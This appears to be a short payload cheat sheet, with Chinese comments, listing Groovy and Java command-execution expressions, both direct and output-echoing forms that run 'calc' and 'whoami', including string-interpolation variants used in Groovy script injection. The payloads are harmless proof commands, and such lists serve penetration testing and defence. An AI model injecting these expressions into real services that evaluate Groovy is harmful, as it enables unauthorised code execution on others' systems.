// 直接命令执行
Runtime.getRuntime().exec("calc")
"calc".execute()
'calc'.execute()
"${"calc".execute()}"
"${'calc'.execute()}"

// 回显型命令执行
println "whoami".execute().text
println 'whoami'.execute().text
println "${"whoami".execute().text}"
println "${'whoami'.execute().text}"
def cmd = "whoami";
println "${cmd.execute().text}";